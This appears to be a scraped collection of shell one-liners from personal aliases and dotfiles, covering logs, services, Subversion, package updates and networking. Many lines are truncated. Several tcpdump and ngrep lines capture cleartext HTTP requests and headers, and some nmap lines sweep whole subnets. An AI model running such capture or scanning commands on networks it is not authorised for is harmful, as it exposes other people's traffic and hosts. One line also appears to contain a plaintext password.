tail -F /var/log/daemon/debug | grep puppet-master
tail -F /var/log/daemon/debug | grep puppet-agent
tail -F /var/log/daemon/debug | grep puppet
tail -F /var/log/bbs.log | grep restored
tail -F /var/log/bbs.log | grep purger
tail -F /var/log/bbs.log | grep netclient
tail -F /var/log/bbs.log | grep backupd
tail -F /service/dnscache/log/main/current| djbdns-log.py
tail -F **/*.log|ccze
tail -F $syslog | highlight
tail -F $(ls -1tr | tail -n 1)
tail -50f /var/log/akam.log | grep -vi trucker
tail -50 /Volumes/wo2dev/WINDOWS/temp/php-errors.log | less
tail -300 ${ORACLE_BASE}/diag/rdbms/${ORACLE_SID}/${ORACLE_SID}/trace/alert_${ORACLE_SID}.log|less -R
tail -20000 ~/.persistent_history | tee ~/.persistent_history
tail -2 | head -1
tail -1|tee _T1>/dev/null&&printf \
tail -100f $PGDATA/pg_log/`ls -t $PGDATA/pg_log/ | head -1`
tail -10000 /var/log/pm-suspend.log | grep -B1 'Finished'
tail -1000 -f /var/log/messages | more
tail -1 |cut -d '-' -f 2
tail -1 /etc/resolv.conf | cut -d' ' -f2
tail $0 | /usr/local/bin/colorize
tai64n|tai64nlocal
tags | egrep '^[a-z0-9-]* *$'
tag=`git rev-list --tags | head -1` && tag=`git describe --tags $tag` && git checkout $tag && echo $tag
tac ~/twit/archvw-themrt.txt | head -n 20
tac ~/twit/archvw-rtofme.txt | head -n 10
tac ~/twit/archvw-reply2me.txt | head -n 10
tac ~/twit/archvw-myarchv.txt | head -n 10
tac ~/twit/archvw-dmsent.txt | head -n 5
tac | less -R
tac | fzf -e --multi --no-sort --reverse
tac /var/log/syslog | more
tac /var/log/httpd/access_log* | less
tac $HISTFILE | less
tac $(ls ~/dandavison7@gmail.com/shell_history/bash_eternal_history_0* | tac)
tabset --title $(pwd | awk -F/ \
table | nl
t | wc -l
t | spd-say --pipe-mode
t | festival --tts
t timeline | less
t timeline -l | tweettrim
t rc.gc=off +ACTIVE _ids | xargs task rc.gc=off rc.confirmation=no rc.bulk=yes stop
t list | grep @band
t list timeline shortlist -l | tweettrim
t config view | grep current_cluster
t -x ls +birthdays | grep $1
t -f | grep
sz && sz err.txt generated.file succ.txt | sort -hr
systemd-analyze plot > bootchart.svg | eog bootchart.svg
systemd-analyze blame | head
systemd-analyze blame | ccze -A
systemctl | grep service
systemctl | grep running
systemctl | grep
systemctl status | grep \
systemctl status evmserverd httpd|more; evmserver.sh status
systemctl status -t service|grep service
systemctl list-units | grep $1
systemctl list-units -t service --no-pager --no-legend | grep active
systemctl list-units --type=service |more
systemctl list-units --type=service --state=running | ccze -A
systemctl list-unit-files |grep enabled
systemctl list-unit-files | grep enabled
systemctl list-unit-files | grep enable
systemctl list-unit-files | grep disable
systemctl list-unit-files | ag enable
systemctl list-unit-files | ag disable
systemctl list-unit-files -t service | grep enabled
systemctl list-unit-files -t service | grep disabled
systemctl list-unit-files --type=service | grep enabled
systemctl list-timers | less
systemctl --user stop syncthing.service ; systemctl --user status syncthing.service | cat
systemctl --user status offlineimap-oneshot@hotmail.timer | grep Trigger
systemctl --user status offlineimap-oneshot@hamburg.timer | grep Trigger
systemctl --user start syncthing.service ; systemctl --user status syncthing.service | cat
systemctl --user list-unit-files | grep enabled
systemctl --full --all | fgrep -i
system_profiler SPUSBDataType | grep -A 11 -w \
system_profiler SPSoftwareDataType | grep \
system_profiler SPPowerDataType | grep
system_profiler SPHardwareDataType | awk '/Serial/ {print $4}'
system_profiler SPHardwareDataType -detailLevel mini | grep \
system_profiler SPDisplaysDataType | grep Resolution
system_profiler SPDisplaysDataType | awk -F ':' '/Resolution/ {print \$2}'
system_profiler SPAirPortDataType | awk -F\
syslog | grep -i \
syslog -k Time ge -10h | egrep -e 'loginwindow'
syslog -F '\$Time \$Message' -k Sender com.apple.backupd-auto -k Time ge -30m | tail -n 1
syslog -F '\$Time \$Message' -k Sender /System/Library/CoreServices/backupd -k Time ge -30m | tail -n 1
sysctl hw.sensors | grep
sysctl hw | sed -E '2!d;s/^.*=//'
sysctl -a |grep temper
sysctl -a |grep tempe
sysctl -a |grep kern.boottime
sysctl -a | grep waketime
sysctl -a | grep temperature
sysctl -a | grep net
sysctl -a | grep hw.memsize
sysctl -a | grep battery
sysctl -a | grep
synccount=$(echo $(cat ~/.synccount)+1|bc); echo $synccount > ~/.synccount
sync; echo 3 | sudo tee /proc/sys/vm/drop_caches > /dev/null
sync; echo 3 | sudo tee /proc/sys/vm/drop_caches
sync; echo 3 | sudo tee /proc/sys/vm/drop-caches
sync; echo 2 | sudo tee /proc/sys/vm/drop_caches
sync | echo 3 > /proc/sys/vm/drop_caches
sync && echo 3 | sudo tee /proc/sys/vm/drop_caches >/dev/null
sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
sy_console router:debug|less
swp | xargs rm
swlist | grep -i
swift build | xcpretty
swconfig dev switch0 show|grep speed
sw_vers; system_profiler SPHardwareDataType | head -n 15; echo
svnst | sed 's/^[^\s]\s*\([^\s].*\)$/\1/g'
svnperl | xargs -I{} perl -cIlib {}
svncolor log -v -l 10 | less
svn_untracked | xargs rm -rf
svn_r | colorprops
svn_color log -l 25 | less -rF
svnPath | pbcopy
svn-unversioned | xargs rm -rf
svn up | tee svnup.log
svn up && svn log -l 200 -v | less
svn st|grep ^C
svn st|grep -v node_modules
svn st|grep '[MA]'
svn st|egrep '^[^PX]'
svn status|grep ^[^?]
svn status|grep ^?
svn status | less
svn status | grep orig
svn status | grep ^\?
svn status | grep ^[^?]
svn status | grep ^M
svn status | grep \\b[AMD]\\s
svn status | grep \
svn status | grep M
svn status | grep -v ^?
svn status | grep -v \?
svn status | grep -v \
svn status | grep -v ?
svn status | grep -v '^\?'
svn status | grep -v '^?'
svn status | grep -v '.workspace.vim'
svn status | grep --color=never \
svn status | grep '^[^?].*$' --color=none
svn status | grep 'M\s'
svn status | grep
svn status | colorstatus
svn status | awk '{if (\$1 == \
svn status | awk '/^\?/ {print $2}'
svn status | awk '/^[^?]/ { print }'
svn status | awk '/^?/ { print }'
svn status 2>&1 | perl -pe
svn status . | grep ^M
svn status . | grep \
svn status . SWT Deployment/`getApplicationInstance` | tr \\ /
svn status -u | grep ^M'
svn status --no-ignore | grep rej
svn status --no-ignore | grep '^[M]'
svn status --no-ignore | grep
svn status --ignore-externals | grep .git -v
svn status --ignore-externals | grep -v ^X
svn status --ignore-externals | colorstatus
svn stat |prune-svn-stat
svn stat | grep -v ^?
svn stat | grep -v \\?
svn stat | grep -v \.swp
svn stat | grep
svn stat . | grep ?
svn stat --ignore-externals | grep
svn stat ${PROJWS} | grep -E \
svn st ~/almato/* | grep -v '^?'
svn st | tr \\\\ /
svn st | sort
svn st | less
svn st | grep ^M
svn st | grep ^?
svn st | grep \
svn st | grep M
svn st | grep D
svn st | grep A
svn st | grep ?
svn st | grep -v ^\?
svn st | grep -v ^?
svn st | grep -v \?
svn st | grep -v ?
svn st | grep -v '^[X?]'
svn st | grep -v '^?'
svn st | grep -E '^.?[MAD]\s+'
svn st | grep '^[MA]' --color
svn st | grep
svn st | cut -c 9-
svn st | awk '{if ( $1 == \
svn st | awk '{if ( $1 ==
svn st | awk '\$1 == \
svn st | awk '/^[^?]/'
svn st | awk '/!/ {print \
svn st | awk
svn st | /bin/grep -v ^?
svn st web|grep '[MA]'
svn st -u | grep -v ^\?
svn st -u | grep -v ^?
svn st -u | grep '*'
svn st --no-ignore | grep ^M
svn st --ignore-externals | grep -v ^X
svn st --ignore-externals | grep -v '^X'
svn st --ignore-externals | grep -v '^X '
svn st --ignore-externals | grep '^[[:space:]C\!\~]'
svn st --ignore-externals | grep '^[[:space:]ACDIMR\!\~]'
svn ls -v | sort -nr
svn log|more
svn log|less
svn log|head
svn log| svn-short-log
svn log |tac
svn log |head -n 30
svn log | vim -
svn log | tac
svn log | perl -l40pe 's/^-+/\n/'
svn log | mvim
svn log | more
svn log | lessr
svn log | less -r
svn log | less
svn log | head -n 50
svn log | head -n 20
svn log | head -20
svn log | grep -B3 start
svn log | grep -B3 merge
svn log https://github.com/bakerunavco/SSARA.git/trunk | less
svn log https://192.168.188.2/svn/ESBU/zld/snapshot/10.02-SDWAN/Patch3/ | less
svn log https://192.168.188.2/svn/ESBU/zld/snapshot/10.02-SDWAN/Patch2/ | less
svn log https://192.168.188.2/svn/ESBU/zld/snapshot/10.02-SDWAN/ITS/Patch3/ | less
svn log https://192.168.188.2/svn/ESBU/zld/snapshot/10.02-SDWAN/ITS/Patch2/ | less
svn log https://192.168.188.2/svn/ESBU/zld/snapshot/10.02-SDWAN/ITS/Patch1/ | less
svn log https://192.168.188.2/svn/ESBU/zld/snapshot/10.02-SDWAN/ITS/Patch0/ | less
svn log https://192.168.188.2/svn/ESBU/zld/branch/10.00-SDWAN/ | less
svn log http://web.ccs.miami.edu/repos/insarlab/trunk/rsmas_insar | less
svn log http://earthdef.caltech.edu/svn/pyaps | less
svn log 2> /dev/null | less
svn log . -l 20 | perl -l40pe 's/^-+/\n/'
svn log -v|less
svn log -v | vim -
svn log -v | more
svn log -v | less
svn log -v 2> /dev/null | less
svn log -v . | less
svn log -v -r{`date '+%Y-%m-01'`}:{`date '+%Y-%m-31'`} | colordiff
svn log -v --limit 6 | less
svn log -q|more
svn log -q | awk -F
svn log -l 20 | perl -l40pe 's/^-+/\n/'
svn log -l 1024 -v | less
svn log -l 100 -v | less
svn log -l 10 -r HEAD:1 | less
svn log --verbose | less
svn log --stop-on-copy | less
svn log --limit 6 --verbose | less
svn log --limit 5 --verbose | less
svn log --limit 4 --verbose | less
svn log --limit 30|less
svn log --limit 3 --verbose | less
svn log --limit 2 --verbose | less
svn log --diff --limit 10|less
svn info|gawk /URL/
svn info; pwd | grep dev-branches
svn info | while read -r line; do sed -rn 's/Relative URL: \^?(.*)/\1/p'; done
svn info | sed -ne 's/URL: //p'
svn info | grep URL
svn info | awk
svn info 2>&1 | grep URL
svn diff|vless
svn diff|vim -
svn diff|more
svn diff|mate
svn diff|less
svn diff|gvim -R -
svn diff|diffstat
svn diff|colordiff
svn diff |pygmentize -ldiff
svn diff | vless
svn diff | vimdiff -
svn diff | vim -R -
svn diff | vim -
svn diff | view -
svn diff | vi -
svn diff | tr -d \\r > archivoTemporalDeDiff && (vim archivoTemporalDeDiff; rm archivoTemporalDeDiff)
svn diff | sed -r
svn diff | nvim -R -
svn diff | nvim -
svn diff | mvim
svn diff | meld -
svn diff | mate && svn ci
svn diff | mate
svn diff | lv -c
svn diff | lessr
svn diff | less -r
svn diff | less -R
svn diff | less -
svn diff | less
svn diff | gview -
svn diff | grep ^[+-]
svn diff | grep ^I
svn diff | grep Index:
svn diff | diffstat
svn diff | colourdiff
svn diff | colordiff
svn diff | cless
svn diff | cdiff
svn diff | adt
svn diff | ${PAGER}
svn diff | ${PAGER_DIFF}
svn diff | $PAGER
svn diff | $EDITOR -
svn diff quickcheck.sh.log.txt | colordiff
svn diff > _svn-diff.txt | svn revert -R .
svn diff -x-b | vi -
svn diff -x -w | vim -R -
svn diff -x -u --diff-cmd colordiff | less -FR
svn diff -x --ignore-space-change | less
svn diff -x --ignore-eol-style -x -w |diffstat
svn diff -x --ignore-all-space -x --ignore-eol-style | vi -v -
svn diff -rPREV | mvim -
svn diff -r PREV:COMMITTED | view -
svn diff -r PREV | view -
svn diff -r PREV | mate
svn diff --no-diff-deleted | less -R
svn diff --git | kompare -o -
svn diff --force | cdiff
svn diff --diff-cmd=colordiff|less
svn diff --diff-cmd=colordiff | less -RS
svn diff --diff-cmd=colordiff | iconv -f ibm866 -t utf-8
svn diff --diff-cmd diffb | cdiff
svn diff --diff-cmd colordiff | less -R
svn diff ${@} | colordiff
svn diff $* | colordiff
svn diff !* | mate
svn di | vim - -R
svn di | vim -
svn di | mate
svn di | diff_painter.pl
svn di | colordiff
svn cl checkmein $(svn st | awk
svn cl --remove $(svn st | awk
svn add `svn status . | awk '/^[?]/{print $2}'`
svn --ignore-externals status | grep ^[ACDGMR?]
sudoifnotroot fatrace | grep -v xfce4-terminal
sudo ~/dotfiles/others/cleansystem.sh | lolcat
sudo zgrep ssh /var/log/auth.log* | grep -i failed
sudo zfs list -t snapshot | grep
sudo yum list |grep -i
sudo yum list | grep
sudo yes | $(history -p !!)
sudo vp | vp_summary.pl
sudo vim `ls -t /var/log/messages* | head -1`
sudo undervolt --core -150 --cache -150 --gpu -50 | echo evie1407
sudo umount /mnt/pi_* |
sudo umount /mnt/phone_* |
sudo umount /mnt/camera_* |
sudo umount /mnt/Untitled* |
sudo umount /mnt/PMHOME |
sudo tune2fs -l /dev/sda8 | sudo grep 'Filesystem created:'
sudo tune2fs -l /dev/sda1 | grep created
sudo tlp-stat | grep energy
sudo tlp-stat | grep BAT
sudo tlp stat | grep -iE '^mode'
sudo tcpflow -c -i lo tcp port 8080 | grep User-Agent:
sudo tcpflow -c -i lo tcp port 8080 | grep Referer:
sudo tcpflow -c -i lo tcp port 8080 | grep Location:
sudo tcpflow -c -i lo tcp port 8080 | grep From:
sudo tcpflow -c -i lo tcp port 80 | grep X-Real-IP:
sudo tcpflow -c -i lo tcp port 80 | grep User-Agent:
sudo tcpflow -c -i lo tcp port 80 | grep Referer:
sudo tcpflow -c -i lo tcp port 80 | grep Location:
sudo tcpflow -c -i lo tcp port 80 | grep From:
sudo tcpdump | grep $*
sudo tcpdump -vvAls0 | ag 'User-Agent:'
sudo tcpdump -vvAls0 | ag 'GET'
sudo tcpdump -vv | ccze
sudo tcpdump -n -w- | play --buffer 10000 -r 8000 -b 8 -c 1 -e signed-integer -t raw - band 2k vol 0.1
sudo tcpdump -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -n -e -tttt -i pflog0 | grep igb2
sudo tcpdump -n -e -tttt -i pflog0 | grep igb1
sudo tcpdump -n -e -tttt -i pflog0 | grep igb0
sudo tcpdump -n -e -tttt -i pflog0 | grep em0
sudo tcpdump -n -e -tttt -i pflog0 | grep -w 'igb[0-2]'
sudo tcpdump -n -c 9999 -w - | wireshark -k -i -
sudo tcpdump -l -q -ien1 | format-packet.sh
sudo tcpdump -l -q -ien1 src `hostname -s` | format-packet.sh
sudo tcpdump -l -q -ien1 dst `hostname -s` | format-packet.sh
sudo tcpdump -i wlp60s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i wlp5s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i wlp58s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i wlp4s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i wlp3s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i wlp2s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i wlo1 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i wlan0 -n -w- | play --buffer 10000 -r 8000 -b 8 -c 1 -e signed-integer -t raw - band 2k
sudo tcpdump -i wlan0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i vr0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i jnc0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i eth0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i enp59s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i enp3s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i enp2s0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i enp0s3 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i enp0s25 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i en3 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i en2 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i en1 -n -s 0 -w — | grep -a -o -E \
sudo tcpdump -i en1 -n -s 0 -w - | grep -aoE \
sudo tcpdump -i en1 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i en1 -n -s 0 -w - | grep -a --color=never -o -E \
sudo tcpdump -i en0 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i em1 -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i ${ninterface} -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i $NETIF -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i $ETH -n -s 0 -w - | grep -a -o -E \
sudo tcpdump -i $(activeinterface) -n -s 0 -w - | grep -a -o -E \
sudo tarsnap --list-archives | sort
sudo tarsnap --configfile /etc/tarsnap.conf --list-archives -vv | sort
sudo tailf /var/log/messages | ccze -A
sudo tail -n 200 /var/log/apache2/error.log | less
sudo tail -n 200 /var/log/apache2/access.log | less
sudo tail -f `ls -t /var/log/messages* | head -1`
sudo tail -f /var/log/system.log | grep --line-buffered sshuttle
sudo tail -f /var/log/syslog | grep 'haka\\['
sudo tail -f /var/log/syslog | ccze
sudo tail -f /var/log/messages.log | loco
sudo tail -f /var/log/messages | loco
sudo tail -f /var/log/messages | ccze -A -p syslog
sudo tail -f /var/log/maillog | ccze -A -p syslog
sudo tail -f /$DIR_MEDOLUTION/medolutioniot/storage/logs/laravel.log | ccze -A
sudo tail -f -n 25 /var/log/httpd/error_log | grep 127.0.0.1
sudo sysv-rc-conf --list | grep '2:on'
sudo systemd-coredumpctl list | tail
sudo systemd-analyze blame | head -20
sudo systemctl | grep stopped
sudo systemctl | grep running
sudo systemctl | grep error
sudo systemctl suspend | slock
sudo systemctl stop xrdp | sudo systemctl stop xrdp-sesman
sudo systemctl stop httpd | sudo systemctl stop mysqld
sudo systemctl stop dnsmasq && cat /dev/null | sudo tee /etc/pihole/dhcp.leases
sudo systemctl status telraam_monitoring.service | cat
sudo systemctl status telraam_camera_stream.service | cat
sudo systemctl status telraam_ap_control_loop.service | cat
sudo systemctl status openvpn@SUSE-$ENDPOINT | tail -2
sudo systemctl start xrdp | sudo systemctl start xrdp-sesman
sudo systemctl start httpd | sudo systemctl start mysqld
sudo systemctl restart xrdp | sudo systemctl restart xrdp-sesman
sudo systemctl restart httpd | sudo systemctl restart mysqld
sudo systemctl list-units|grep -iE
sudo systemctl list-units |grep failed
sudo systemctl list-unit-files | grep
sudo sysctl -w vm.drop_caches=3 && sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
sudo sync; sudo echo 3 | sudo tee /proc/sys/vm/drop_caches > /dev/null
sudo sync; sudo echo 3 | sudo tee /proc/sys/vm/drop_caches
sudo sync; sudo echo 1 | sudo tee /proc/sys/vm/drop_caches > /dev/null
sudo sync && sudo echo 3 | sudo tee /proc/sys/vm/drop_caches
sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches;sudo free -mh;
sudo svc -d /etc/service/server/; pgrep -f $SERVER_PID_PATTERN | xargs kill
sudo svc -d /etc/service/ows/; sudo pgrep -f $OWS_PID_PATTERN | xargs kill
sudo su -c 'echo level 1 | tee /proc/acpi/ibm/fan'
sudo ss -lpnt |column -t
sudo softwareupdate -i -a; brew update; brew upgrade; brew cleanup; npm install npm -g; npm update -g; sudo gem update --system; sudo gem update; sudo gem cleanup; pip freeze --local | grep -v
sudo softwareupdate -i -a; brew update; brew upgrade; brew cleanup; brew cask cleanup; brew prune; npm update -g npm; npm update -g; updateRuby; sudo gem update --system; gem update; gem cleanup; pip freeze --local | grep -v
sudo softwareupdate -i -a; brew update; brew upgrade; brew cask list | xargs brew cask install --force; brew cleanup; brew cask cleanup; sudo gem update --system; sudo gem update; sudo gem cleanup
sudo smartctl -l devstat /dev/sda | awk
sudo smartctl -a /dev/sdb1 | less
sudo smartctl -a /dev/sda1 | less
sudo smartctl -a /dev/sda | less
sudo smartctl -a /dev/sda | grep SSD_Life_Left
sudo smartctl -A /dev/sda | awk
sudo sh -c 'yes | pacman -Scc' && sudo journalctl --vacuum-time=1day && sudo pacdiff && sudo pacman -Rs $(pacman -Qdtq)
sudo service --status-all | grep \ -
sudo service --status-all | grep \ +
sudo service --status-all | grep +
sudo run-parts /etc/update-motd.d | sudo tee /run/motd.dynamic
sudo rsync -avi --delete --exclude=/usr/local/oradata/ /usr/local/ /var/run/media/${USER}/Elements/${HOSTNAME%%.*}/usr/local | grep -v \.[fd]\/\/\/pog\.\.\.
sudo rpm -qa | grep
sudo rpm -e `rpm -qa | grep -e pts
sudo rm -rfv /var/lib/apt/lists | lolcat
sudo qlop -tgH $(qlist -IC) | sort -nk2
sudo qlop -c | grep total
sudo puppet agent -t | grep err &
sudo ps faxvvvv | gr
sudo ps axjf | grep -A5 puppet
sudo ps ax | percol
sudo ps ax | grep
sudo ps ax | ack
sudo ps auxf | less
sudo ps aux | grep
sudo ps -ef | less -R
sudo ps -ef | grep vnc
sudo ps -ef | grep nginx
sudo ps -ef | grep -i
sudo ps -ef | grep
sudo ps -aux |grep -i
sudo ps -aef | grep HandBrakeCLI
sudo powermetrics -i 1000 --poweravg 1 | grep 'Average cumulatively decayed power score' -A 20
sudo port -v selfupdate; sudo port -v upgrade outdated; port installed | grep -v active
sudo pon work && sleep 5 && ifconfig | grep ppp
sudo pon UIUC && until ip link show ppp0 2>&1 |grep pfifo_fast &> /dev/null; do sleep 1; done && sudo route add default dev ppp0
sudo pm-suspend | lock
sudo pkill -f [A]DTPro; while [[ $(ps aux | grep [A]DTPro) ]]; do sleep 1; done; adtpro-start
sudo pkill -INT -f snx; stoken |
sudo pkill -INT -f openconnect; stoken | sudo openconnect
sudo pip3 freeze --local | grep -v
sudo pip install -U $(pip freeze | cut -d
sudo pip install --user --upgrade $(pip list --outdated --format=json | jq '.[].name' --raw-output)
sudo pip freeze --local | sudo grep -v
sudo pip freeze --local | grep -v
sudo pgrep coreaudiod | xargs sudo kill
sudo pgrep -f $SERVER_PID_PATTERN | xargs kill
sudo pgrep -f $OWS_PID_PATTERN | xargs kill
sudo pfctl -q -s info | head -n 1; sudo pfctl -q -s states
sudo pacman -Syyu; pacman -Qu | wc -l > ~/.paccount
sudo pacman -Syyu && figlet -f future Update Complete | lolcat
sudo pacman -Syu | lolcat
sudo pacman -Syu --needed $(grep -v '^#' ~/.packages | xargs)
sudo pacman -Syu && echo Update Complete! | figlet
sudo pacman -Sy archlinux-keyring manjaro-keyring --noconfirm python2 | grep -i installed && date && trizen -Syyua --noconfirm
sudo pacman -Sy `pacman -Q | awk '{print $1}'`
sudo pacman -Sy `pacman -Q | awk
sudo pacman -Ss | grep
sudo pacman -Sl extra | grep
sudo pacman -Sg | grep blackarch
sudo pacman -S $(pacman -Ss ttf | sed -n
sudo pacman -Rns $(pacman -Qtdq | tr '\n' ' ')
sudo pacman -Rns $(pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g')
sudo pacman -Rns $(pacman -Qtdq | paste -sd ' ')
sudo pacman -R \$(pacman -Qdt | awk '{print \$1}')
sudo pacman -Q|wc -l
sudo pacman -Qqu | wc -l
sudo pacman -Qq | wc -l
sudo pacman -Qii | awk \
sudo pacman -Qii | awk '/^MODIFIED/ {print $2}'
sudo pacman -Qii | awk
sudo pacman -Qe | wc -l
sudo pacman -Qe | less
sudo pacman -Qdtq | sudo pacman -Rs -
sudo pacman -Qdtq | pacman -Rs -
sudo pacman -Q |grep
sudo pacman -Q | wc -l
sudo pacman -Q | rg
sudo pacman -Q | grep
sudo pacman -Q | dmenu -l 10
sudo openvpn `ls /etc/openvpn/ovpn_udp/us* | shuf -n 1`
sudo ntpdate 3.cn.pool.ntp.org ; date |xargs -I {} sudo hwclock --set --date={}
sudo ntpdate -u $(systemsetup -getnetworktimeserver|awk '{print $4}')
sudo npm i -g npm && npm completion | sudo tee /etc/bash_completion.d/npm > /dev/null && npm -v
sudo nmap -sn 192.168.18.0/24 | grep -B 2 Raspberry
sudo nmap -sn 192.168.0.0/24 | grep Murata -B 2
sudo nmap -sS `echo $gateway|cut -d '.' -f 1-3`.0/24
sudo nmap -sS -O -p80 10.101.21.0/24 | less
sudo nmap -sP \'${host}\' | grep MAC
sudo nmap -sP 192.168.178.0/24 | awk '/^Nmap/{ip=\$NF}/B8:27:EB/{print ip}'
sudo nmap -sP 192.168.112.0/24 | grep Pi -B 2
sudo nmap -sP 192.168.1.0/24 | grep Pi -B 2
sudo nmap -sP 192.168.1.0/24 | awk '/^Nmap/{ip=$NF}/B8:27:EB/{print ip}'
sudo nmap -sP 192.168.*.0/24 | awk '/^Nmap/{ip=$NF}/B8:27:EB/{print ip}'
sudo nmap -sP 10.0.0.0/24 | grep Pi -B 2
sudo nmap -sP -n 192.168.1.0/24 | awk 'NR>2 && (NR-3)%3 == 0 {print $5;}'
sudo nmap -O -v xxx.xxx.x.x/xx | grep Pi
sudo ngrep -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d ‘en1' -t ‘^(GET|POST) ‘ ‘tcp and port 80'
sudo ngrep -d wlp2s0 -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'wlp60s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'wlp59s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'wlp58s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'wlp3s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'wlp2s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'wlo1' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'wlan0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'vr0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'ppp0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'jnc0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'eth1' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'eth0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'enp59s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'enp2s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'enp0s31f6' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'enp0s25' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'en4' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'en3' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'en2' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'en10' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'en1' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'en0' -t -q -W byline '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'en0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d 'en0' -t '^(GET|POST) ' 'tcp and (port 80 or port 443)'
sudo ngrep -d 'em1' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d '${ninterface}' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d '$NETIF' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d '$ETH' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d '$(activeinterface)' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -d $_interface -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -W byline -d 'wlp2s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -W byline -d 'eth1' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -W byline -d 'en1' -t '^(GET|POST) ' 'tcp and port 80'
sudo ngrep -W byline -d 'en0' -t '^(GET|POST) ' 'tcp and port 80'
sudo netstat -tunplea | grep $@
sudo netstat -tunplea | grep
sudo netstat -tunlp|grep
sudo netstat -tulpn | less
sudo netstat -tulpn | grep LISTEN --color=never
sudo netstat -tulpn | grep LISTEN
sudo netstat -tulpn | grep -i
sudo netstat -tulpn | grep
sudo netstat -tulpen | grep LISTEN
sudo netstat -tulpen | grep
sudo netstat -tulnp | grep
sudo netstat -tulanp | less
sudo netstat -tulanp | grep LISTEN
sudo netstat -tulanp | grep -i listen
sudo netstat -tulanp | grep
sudo netstat -tuapn |grep -i
sudo netstat -tpuan | grep LISTEN
sudo netstat -tpan | grep \
sudo netstat -tnpa | grep 'ESTABLISHED.*sshd'
sudo netstat -taupn | grep LISTEN
sudo netstat -taupln | grep LISTEN
sudo netstat -putan | grep LISTEN
sudo netstat -pnut -W | column -t -s $'\t'
sudo netstat -pnW --inet | less
sudo netstat -plten | grep
sudo netstat -plant | grep LISTEN
sudo netstat -pant|grep LISTEN
sudo netstat -p tcp -van | grep LISTEN
sudo netstat -ntpl | grep
sudo netstat -ntlp | grep
sudo netstat -nptul | grep
sudo netstat -nptu | grep
sudo netstat -np | grep EST
sudo netstat -nlp | grep ssh
sudo netstat -nlp | grep 3000
sudo netstat -nlp | grep
sudo netstat -netpul | grep $*
sudo netstat -natp | grep -i listen
sudo netstat -natop | grep $1
sudo netstat -nap | grep 10011
sudo netstat -nap | grep 0.0.0.0
sudo netstat -nap | grep $1
sudo netstat -ltnp | grep $1
sudo netstat -lpn | grep
sudo netstat -lnp | grep :6600
sudo netstat -lantp | grep -i establ
sudo netstat -atp tcp | grep
sudo netstat -atevpN | grep
sudo netstat -anup | grep
sudo netstat -antulp | grep LISTE
sudo netstat -antp | grep LISTEN
sudo netstat -antp | grep 9527
sudo netstat -antp | grep
sudo netstat -antp | awk
sudo netstat -anp | grep ESTABLISHED
sudo netstat -anp --tcp --udp | grep LISTEN
sudo netstat -an | grep
sudo netstat -alpe --ip | grep paul
sudo netstat -alnp|grep -w LISTEN
sudo netstat -aepW|less
sudo netstat --wide --symbolic --tcp --udp --listening --program --extend | grep 5001
sudo netctl stop xtra | sudo netctl start unifr
sudo netctl stop unifr | sudo netctl start xtra
